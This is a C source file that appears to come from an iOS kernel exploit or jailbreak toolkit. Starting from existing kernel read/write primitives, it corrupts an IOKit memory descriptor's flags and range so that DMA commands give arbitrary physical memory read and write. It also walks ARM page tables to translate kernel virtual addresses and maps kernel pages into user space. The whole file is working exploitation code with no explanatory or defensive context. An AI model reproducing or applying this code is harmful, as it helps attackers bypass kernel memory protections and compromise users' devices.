#include "physrw.h"
#include "offsets.h"
#include <stdio.h>
#include <string.h>

static uint64_t gRanges = 0;
static mach_port_t gBuffer = 0;
static mach_port_t gDMACommand = 0;
static mach_port_t gDMABuffer = 0;
static uint64_t gDMABufferMapped = 0;
static uint64_t cpuTTEP = 0;

// IOKit helpers (forward declarations)
extern mach_port_t IOBufferMemoryDescriptor_create(uint64_t options, uint64_t size, uint64_t alignment);
extern uint64_t IOMemoryDescriptor_map(mach_port_t md, uint64_t offset, uint64_t len);
extern mach_port_t IODMACommand_create(void);
extern void IODMACommand_prepare(mach_port_t cmd, mach_port_t md);
extern void IODMACommand_readFrom(mach_port_t cmd, mach_port_t from, uint64_t len);
extern void IODMACommand_writeTo(mach_port_t cmd, mach_port_t to, uint64_t len);

bool buildPhysPrimitive(void) {
    mach_port_t buffer = IOBufferMemoryDescriptor_create(0, 0x4000, 0);
    if (!buffer) return false;
    uint64_t kObj = portKObject(buffer);
    if (!kObj) return false;
    // Change flags to mark as physical
    uint32_t flags = kread32(kObj + 0x20);
    flags = (flags & ~0xF0) | 0x20;
    kwrite32(kObj + 0x20, flags);
    uint64_t ranges = kread_ptr(kObj + 0x60);
    if (!ranges) return false;
    gRanges = ranges;
    // Set range to cover all physical memory
    kwrite64(ranges, 0x800000000ULL);
    // Create DMA command
    mach_port_t dmaCmd = IODMACommand_create();
    if (!dmaCmd) return false;
    // Create DMA buffer
    mach_port_t dmaBuf = IOBufferMemoryDescriptor_create(3, 0x4000, 0);
    if (!dmaBuf) return false;
    uint64_t mapAddr = IOMemoryDescriptor_map(dmaBuf, 0, 0);
    if (!mapAddr) return false;
    IODMACommand_prepare(dmaCmd, dmaBuf);
    gBuffer = buffer;
    gDMACommand = dmaCmd;
    gDMABuffer = dmaBuf;
    gDMABufferMapped = mapAddr;
    cpuTTEP = kread64(SLIDE(gOffsets.cpu_ttep));
    return true;
}

bool physread(uint64_t addr, size_t len, void *buffer) {
    if (len > 0x4000) return false;
    kwrite64(gRanges, addr);
    IODMACommand_readFrom(gDMACommand, gBuffer, len);
    IODMACommand_writeTo(gDMACommand, gDMABuffer, len);
    memcpy(buffer, (void*)gDMABufferMapped, len);
    return true;
}

bool physwrite(uint64_t addr, void *buffer, size_t len) {
    if (len > 0x4000) return false;
    kwrite64(gRanges, addr);
    memcpy((void*)gDMABufferMapped, buffer, len);
    IODMACommand_readFrom(gDMACommand, gDMABuffer, len);
    IODMACommand_writeTo(gDMACommand, gBuffer, len);
    return true;
}

uint64_t translateAddr_inTTEP(uint64_t ttep, uint64_t virt) {
    uint64_t l1o = (virt >> 36ULL) & 0x7ULL;
    uint64_t l1e = 0; physread(ttep + 8 * l1o, 8, &l1e);
    if ((l1e & 3) != 3) return 0;
    uint64_t l2t = l1e & 0xFFFFFFFFC000ULL;
    uint64_t l2o = (virt >> 25ULL) & 0x7FFULL;
    uint64_t l2e = 0; physread(l2t + 8 * l2o, 8, &l2e);
    switch (l2e & 3) {
        case 1: return (l2e & 0xFFFFFE000000ULL) | (virt & 0x1FFFFFFULL);
        case 3: {
            uint64_t l3t = l2e & 0xFFFFFFFFC000ULL;
            uint64_t l3o = (virt >> 14ULL) & 0x7FFULL;
            uint64_t l3e = 0; physread(l3t + 8 * l3o, 8, &l3e);
            if ((l3e & 3) != 3) return 0;
            return (l3e & 0xFFFFFFFFC000ULL) | (virt & 0x3FFFULL);
        }
        default: return 0;
    }
}

uint64_t translateAddr(uint64_t virt) {
    return translateAddr_inTTEP(cpuTTEP, virt);
}

uint64_t physrw_map_once(uint64_t addr) {
    uint64_t page = addr & ~0x3FFFULL;
    uint64_t off = addr & 0x3FFFULL;
    uint64_t phys = translateAddr(page);
    if (!phys) return 0;
    kwrite64(gRanges, phys);
    uint64_t mapped = IOMemoryDescriptor_map(gBuffer, 0, 0x4000ULL);
    if (!mapped) return 0;
    return mapped + off;
}
